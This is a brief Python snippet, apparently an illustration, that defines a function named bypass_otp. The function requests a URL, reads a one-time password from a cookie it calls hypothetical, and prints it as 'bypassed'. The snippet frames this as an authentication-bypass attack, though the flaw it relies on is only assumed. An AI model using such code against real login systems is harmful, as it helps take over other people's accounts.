import requests

def bypass_otp(url):
    session = requests.Session()
    response = session.get(url)
    otp = response.cookies['otp']  # Hypothetical cookie
    print(f"OTP Bypassed: {otp}")
